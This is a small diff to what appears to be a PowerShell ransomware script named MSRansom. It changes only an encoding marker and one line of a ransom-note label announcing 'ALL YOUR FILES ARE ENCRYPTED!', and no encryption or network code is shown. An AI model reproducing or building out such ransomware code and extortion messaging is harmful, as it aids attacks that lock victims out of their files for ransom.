@@ -1,4 +1,4 @@
-function MSRansom
+﻿function MSRansom
 {
 
 # Design
@@ -352,7 +352,7 @@ $skullLabel = New-Object System.Windows.Forms.Label
 $skullLabel.ForeColor = [System.Drawing.Color]::Red
 $skullLabel.BackColor = [System.Drawing.Color]::Black
 $skullLabel.Text = @"
-    ☠️ ALL YOUR FILES ARE ENCRYPTED! ☠️
+    ☠️ ALL YOUR FILES ARE ENCRYPTED! ☠️
    
     Your documents, photos, databases, and other
     important files have been encrypted with strong
